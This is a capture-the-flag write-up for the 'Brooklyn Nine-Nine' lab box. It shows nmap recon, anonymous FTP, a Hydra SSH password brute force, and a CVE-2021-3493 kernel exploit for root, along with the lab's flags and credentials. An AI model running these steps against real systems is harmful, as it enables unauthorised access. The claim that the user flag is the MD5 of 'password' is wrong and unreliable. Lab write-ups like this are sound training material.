# Brooklyn Nine-Nine - ( Exploit_Suggester to get root )

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sV <TARGET-IP>
```

**Results:**

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

### Initial Findings

* Anonymous FTP login was enabled.
* FTP contained a file named `note_to_jake.txt`.

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

This strongly suggested that the user **jake** was using a weak password.

---

## Initial Access

### SSH Bruteforce

Using the username `jake` and the `rockyou.txt` wordlist:

```bash
hydra -l jake -P rockyou.txt ssh://<TARGET-IP>
```

**Credentials Found:**

```text
Username: jake
Password: 987654321
```

### SSH Login

```bash
ssh jake@<TARGET-IP>
```

Successfully obtained a shell as **jake**.

---

## Enumeration

### User Enumeration

Checking the `/home` directory revealed three users:

```bash
ls -la /home
```

```text
amy
holt
jake
```

### User Flag

Inside Holt's home directory:

```bash
cat /home/holt/user.txt
```

Output:

```text
ee11cbb19052e40b07aac0ca060c23ee
```

The hash is an MD5 hash for:

```text
password
```

---

## Privilege Escalation

### Linux Exploit Suggester

Standard privilege escalation checks did not reveal any obvious misconfigurations.

Uploaded and executed **Linux Exploit Suggester**:

```bash
./linux-exploit-suggester.sh
```

One of the recommended exploits was:

```text
CVE-2021-3493
```

### Exploitation

Downloaded the exploit source code and compiled it:

```bash
gcc exploit.c -o exploit
```

Execute the exploit:

```bash
./exploit
```

Root shell obtained:

```bash
bash-4.4# whoami
root
```

---

## Root Flag

Navigate to the root directory:

```bash
cd /root
cat root.txt
```

Output:

```text
-- Creator : Fsociety2006 --

Congratulations in rooting Brooklyn Nine Nine

Here is the flag:
63a9f0ea7bb98050796b649e85481845
```

---

## Attack Path Summary

1. Enumerated services using Nmap.
2. Discovered anonymous FTP access.
3. Retrieved a note revealing that user **jake** had a weak password.
4. Bruteforced SSH credentials using Hydra.
5. Logged in as **jake**.
6. Enumerated local users and found the user flag.
7. Used Linux Exploit Suggester for privilege escalation enumeration.
8. Exploited **CVE-2021-3493** to obtain root access.
9. Retrieved the root flag.
